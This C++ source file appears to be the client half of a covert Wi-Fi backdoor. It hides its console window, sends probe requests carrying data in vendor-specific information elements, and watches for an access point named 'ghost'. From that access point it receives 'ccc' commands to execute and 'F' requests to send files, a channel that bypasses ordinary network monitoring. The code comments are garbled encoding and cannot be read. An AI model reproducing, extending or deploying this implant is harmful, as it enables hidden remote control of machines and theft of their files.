#include "mainProcess.h"
#include "Action_ExcuteCmd.h"
#include "Action_Sendfile.h"
mainProcess::mainProcess()
{
	HANDLE hClient = NULL;
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL;
	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
	sendInfo = (char *)malloc(255);
	set_sendInfo("COMMAND\0");
	hash = (char *)malloc(9);
}
mainProcess::~mainProcess()
{
	free(sendInfo);
	free(hash);
	free(hClient);
	free(pIfList);
	free(pIfInfo);
}

void mainProcess::run() {
#ifndef __DEBUG__
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif
	char *ssid = "ghost";
	get_Handle(&hClient, 2, 0);
	get_WlanList(&hClient, &pIfList);
	pIfInfo = get_Wlan(&pIfList);

	while (true) {
		HLOG("----NEW-----\n");
		sendRequest(&hClient, &pIfInfo, get_payload(get_sendInfo()));
		if (getssid(&hClient, &pIfInfo, ssid)) {
			PWLAN_BSS_LIST ppWlanBssList;
			DWORD dwResult2 = WlanGetNetworkBssList(hClient, &pIfInfo->InterfaceGuid,//����һ������������LAN�ӿ��ϵ��������������Ļ������񼯣�BSS������Ŀ���б�
				&pBssEntry->dot11Ssid,
				pBssEntry->dot11BssType,
				pBssEntry->bSecurityEnabled,
				NULL,
				&ppWlanBssList);
			HLOG("%d", ppWlanBssList->dwNumberOfItems);
			for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
			{
				WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];
				HLOG("========\nUSSID�� %s\n", bss_entry->dot11Ssid.ucSSID);
				char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);//��ϢԪ�ص�λ��
				int total_size = bss_entry->ulIeSize;
				//---------------------------------------------
				while (total_size) {		//�������е�payload
					ie_data * ie = (struct ie_data *)pp;

					if ((int)ie->id == 221) {
						char *headMagic = (char *)&ie->val[0];//��λ�� ������Ϣλ��
						HLOG("��ȡ��val�е���Ϣ��%s \n", headMagic);//������Ϣ
						char hash_tmp[9] = { '\0' };
						strncpy(hash_tmp, headMagic + 3, 8);//��ȡhash

						if (strncmp(get_hash(), hash_tmp, 8) == 0) {
							HLOG("��WARNING��REAPTINGHASH : %s\n", get_hash());
							break;
						}
						else {
							set_hash(hash_tmp);
						}

						if (strncmp(headMagic, "ccc", 3) == 0) {//У�������ֶ�
							Action_ExcuteCmd * AC = new Action_ExcuteCmd();
							AC->ExcuteAction(ie, headMagic);
							free(AC);
						}
						else if (strncmp(headMagic, "F", 1) == 0) {
							Action_Sendfile * AC = new Action_Sendfile();
							AC->ExcuteAction(ie, headMagic);
							free(AC);
						}

						set_sendInfo(get_hash());
						break;
					}
					pp += sizeof(struct ie_data) - 1 + (int)ie->len;
					total_size -= sizeof(struct ie_data) - 1 + (int)ie->len;

				}//while


			}//for

		}
		HLOG("----OVER----\n\n\n");
		Sleep(1000);

	}
}

//��ȡ���
DWORD mainProcess::get_Handle(HANDLE *hClient, DWORD dwMaxClient, DWORD dwCurVersion) {
	//dwMaxClient Ϊ�ͻ���֧�ֵ�WLANAPI����߰汾��dwCurVersion Ϊ��λỰ�н���ʹ�õİ汾

	DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, hClient);//��һ��������������ӣ���wlan�����
																			   //HLOG("WlanOpenHandle failed with error: %u\n", dwResult);
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanOpenHandle failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ�����б�
DWORD mainProcess::get_WlanList(HANDLE *hClient, PWLAN_INTERFACE_INFO_LIST *pIfList) {
	if (*pIfList != NULL) {	//����б�
		WlanFreeMemory(*pIfList);
		*pIfList = NULL;
	}
	DWORD dwResult = WlanEnumInterfaces(*hClient, NULL, pIfList);//ö�������ڱ��ؼ�����ϵ�ǰ���õ�����LAN�ӿ�
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanEnumInterfaces failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ����״̬
PWLAN_INTERFACE_INFO mainProcess::get_Wlan(PWLAN_INTERFACE_INFO_LIST *pIfList) {
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	WCHAR GuidString[40] = { 0 };
	HLOG("[INFO]Interface Information��\n");
	HLOG("  Numbers of Interface: %lu\n", (*pIfList)->dwNumberOfItems);//��ӡwlan��Ŀ��
	HLOG("  Current Index: %lu\n", (*pIfList)->dwIndex);//��ӡ��ǰ����
	for (int i = 0; i < (int)(*pIfList)->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&(*pIfList)->InterfaceInfo[i];
		HLOG("  Interface Index[%d]:\t %lu\n", i, i);
		int iRet = StringFromGUID2((pIfInfo)->InterfaceGuid, (LPOLESTR)&GuidString, 39);//��ӡGUID
		if (iRet == 0)
			HLOG("StringFromGUID2 failed\n");
		else {
			HLOG("  InterfaceGUID[%d]: %ws\n", i, GuidString);
		}
		HLOG("  Interface Description[%d]: %ws", i,
			(pIfInfo)->strInterfaceDescription);//��ӡ����
		HLOG("\n");
		HLOG("  Interface State[%d]:\t ", i);//��ӡ״̬
		switch ((pIfInfo)->isState) {
		case wlan_interface_state_not_ready:
			HLOG("Not ready\n");
			break;
		case wlan_interface_state_connected:
			HLOG("Connected\n");
			break;
		case wlan_interface_state_ad_hoc_network_formed:
			HLOG("First node in a ad hoc network\n");
			break;
		case wlan_interface_state_disconnecting:
			HLOG("Disconnecting\n");
			break;
		case wlan_interface_state_disconnected:
			HLOG("Not connected\n");
			break;
		case wlan_interface_state_associating:
			HLOG("Attempting to associate with a network\n");
			break;
		case wlan_interface_state_discovering:
			HLOG("Auto configuration is discovering settings for the network\n");
			break;
		case wlan_interface_state_authenticating:
			HLOG("In process of authenticating\n");
			break;
		default:
			HLOG("Unknown state %ld\n", (pIfInfo)->isState);
			break;
		}
	}
	return pIfInfo;//Ĭ�ϲ��÷������һ��������Ϣ
}

//����̽��
DWORD mainProcess::sendRequest(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo,PWLAN_RAW_DATA pwlan_data) {
	//ssid Ϊ��Ҫ������SSID���ƣ�pwlan_data Ϊ��װ��payload

	//PDOT11_SSID pdo = new DOT11_SSID;  //�洢ssid�Ľṹ��
	//pdo->uSSIDLength = strlen(ssid); //��ȡssid�ĳ��ȣ�����ṹ����.. ULONG����
	//UCHAR *ucp = (UCHAR *)malloc(pdo->uSSIDLength + 1);	//����һ���ռ䣬����λSSID�ĳ���
	//memset(ucp, '\0', pdo->uSSIDLength + 1);	//ucp�����uSSIDLength���ȵĿռ���'\0'���
	//strcpy((char*)ucp, ssid);//��ssid��ֵ��������

	DWORD dwResult = WlanScan(*hClient, &(*pIfInfo)->InterfaceGuid, NULL, pwlan_data, NULL);//ָ���ӿ��Ͻ�������ɨ��
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��Sending probe Request with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Sending probe Request...\n");
	}
	//free(pdo);  //�ͷſռ�
	return dwResult;
}

//��ȡ����AP,Ѱ�������AP
boolean mainProcess::getssid(HANDLE * hClient, PWLAN_INTERFACE_INFO * pIfInfo, char * ssid){
	
	bool findAP = false;
	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
	DWORD dwResult = WlanGetAvailableNetworkList(*hClient, &(*pIfInfo)->InterfaceGuid, 0, NULL, &pBssList);//��ȡ����LAN�ӿ��ϵĿ��������б�
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanGetAvailableNetworkList failed with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Numbers of AP: %lu\n", (pBssList)->dwNumberOfItems);//��ӡAP�ĸ���
		for (int j = 0; j < (pBssList)->dwNumberOfItems; j++) {	//����ÿ��AP�����ƣ������бȽ�
			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& (pBssList)->Network[j];
			HLOG("(%d):%s   ", j, (char *)pBssEntry->dot11Ssid.ucSSID);
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0) {
				findAP = true;
				break;
			}
		}
		findAP? HLOG("\n[INFO]Find Server!\n"): HLOG("\n[INFO]Searching Server...\n");
		return findAP;
	}
}

//=============================
//sendinfo��hash���
//=============================
PWLAN_RAW_DATA mainProcess::get_payload(char *buf) {

	//�ṹ���ʼ���ڴ�
	HLOG("[INFO]Send Context is :%s\n", buf);
	int len = strlen(buf) + 1;	//lenΪ���ݳ��ȣ�+1��������
	int response_len = sizeof(DWORD) + sizeof(struct ie_data) - 1 + len;//!!4+2+8  14,��Ϊÿ���ṹ�嶼������һ����������ݣ�ռ1�ֽ�
	char *response = (char *)malloc(response_len);//���ٴ洢�ռ�
	memset(response, '\0', response_len);//ȫ�����Ϊ'\0'
										 //��������ָ��
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	struct ie_data *piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	//д���ݰ�
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
	piedata->id = (char)221;
	piedata->len = len;
	memcpy(&piedata->val[0], buf, len);
	return pwlan_data;
}
void mainProcess::set_sendInfo(char* infomation) {
	char* magic_code = "acc";	//!!!!����ʶ���ֶ�
	memset(sendInfo, '\0', 255);
	if (strlen(infomation) <= 252) {
		memset(sendInfo, '\0', 255);
		strncpy(sendInfo, magic_code, strlen(magic_code));
		strncpy(sendInfo + 3, infomation, strlen(infomation));
	}
	else {
		HLOG("��ERROR��Send Context len >252 !!!");
	}

}
char* mainProcess::get_sendInfo() {
	return sendInfo;
}
void mainProcess::set_hash(char* h) {
	memset(hash, '\0', 9);
	strncpy(hash, h, 8);
}
char* mainProcess::get_hash() {
	return hash;
}